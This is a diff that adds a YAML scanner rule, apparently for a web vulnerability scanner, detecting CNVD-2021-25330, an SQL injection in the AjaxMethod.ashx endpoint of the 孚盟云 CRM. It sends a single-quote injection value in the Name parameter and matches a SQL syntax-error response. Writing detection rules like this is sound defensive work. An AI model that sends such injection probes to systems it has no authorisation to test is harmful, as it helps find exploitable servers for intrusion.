@@ -1,0 +1,17 @@
+id: CNVD-2021-25330
+
+info:
+  name: 孚盟云 AjaxMethod.ashx SQL注入
+  author: qwtd
+  severity: high
+  verified: true
+  description: |
+    孚盟云 AjaxMethod.ashx文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器权限。
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'
+    expression: response.status == 500 && response.body.bcontains(b'附近有语法错误')
+expression: r0()
